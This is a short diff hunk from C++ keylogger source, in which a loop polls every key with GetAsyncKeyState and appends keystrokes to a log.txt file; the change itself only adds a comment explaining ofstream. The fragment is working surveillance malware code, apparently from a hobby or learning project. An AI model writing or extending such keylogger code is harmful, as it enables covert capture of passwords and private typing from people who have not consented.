@@ -17,7 +17,7 @@ void StartLogging(){
     while (true) {
         for(c=1;c<=254;c++){
             if(GetAsyncKeyState(c) &  0x1 ) {
-                ofstream log;
+                ofstream log;//ofstream is used to read or write to files we can specify path of the file too by:- ofstream outfile (path);
                 log.open("log.txt", ios::app);
                 switch (c)/*This Switch-Case handles unreadable characters*/ {
                     case VK_BACK:
